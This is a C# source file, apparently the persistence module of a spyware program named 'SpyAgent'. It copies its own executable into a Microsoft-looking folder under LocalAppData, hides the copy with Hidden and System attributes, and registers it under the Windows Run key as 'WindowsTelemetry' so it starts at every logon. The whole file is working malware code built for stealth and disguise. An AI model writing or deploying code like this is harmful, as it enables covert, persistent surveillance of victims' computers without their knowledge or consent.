namespace SpyAgent.Persistence;

using Microsoft.Win32;

internal static class RegistryAutostart
{
    private const string RunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    private const string ValueName = "WindowsTelemetry";

    public static void Install()
    {
        var currentPath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(currentPath)) return;

        var installDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Telemetry");

        Directory.CreateDirectory(installDir);
        var targetPath = Path.Combine(installDir, "telemetry.exe");

        if (!File.Exists(targetPath) || new FileInfo(currentPath).Length != new FileInfo(targetPath).Length)
        {
            File.Copy(currentPath, targetPath, overwrite: true);
            File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
        }

        using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
        key?.SetValue(ValueName, $"\"{targetPath}\"");
    }

    public static void Remove()
    {
        using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
        key?.DeleteValue(ValueName, throwOnMissingValue: false);
    }

    public static bool IsInstalled()
    {
        using var key = Registry.CurrentUser.OpenSubKey(RunKey);
        return key?.GetValue(ValueName) != null;
    }
}
